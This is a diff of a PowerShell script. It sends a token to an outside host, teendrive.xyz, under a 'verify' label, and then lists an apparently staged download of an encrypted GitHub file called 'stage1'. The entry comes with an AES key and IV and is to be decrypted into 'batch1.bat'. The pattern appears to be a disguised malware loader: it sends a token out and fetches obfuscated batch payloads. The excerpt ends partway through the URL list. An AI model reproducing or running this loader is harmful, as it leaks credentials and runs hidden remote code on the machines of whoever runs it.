@@ -1,8 +1,18 @@
-if (-not $token) { exit 1 }
+if (-not $token) {
+exit 1
+}
 
-$endpoint = "https://teendrive.xyz/api/verify"
-$body = @{ token = $token } | ConvertTo-Json
-try { Invoke-RestMethod -Uri $endpoint -Method Post -Body $body -ContentType "application/json" } catch {}
+   $endpoint = "https://teendrive.xyz/api/verify"
+   $body = @{ token = $token } | ConvertTo-Json
+
+   try {
+       $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $body -ContentType "application/json"
+       Write-Host "Verification sent! Server response:" -ForegroundColor Green
+       Write-Host $response
+   } catch {
+       Write-Host "Verification failed. Error:" -ForegroundColor Red
+       Write-Host $_
+   }
 
 $urls = @(
     @{url="https://github.com/TeenDrive/TeenDrive/raw/refs/heads/main/stage1"; out="batch1.enc"; dec="batch1.bat"; key="4bxXABIN1x7cBjVFt/787F931AXjgjp6tSI/ub3Ga7Q="; iv="Viuu5G6wiSV3CEAihlHG/w=="},
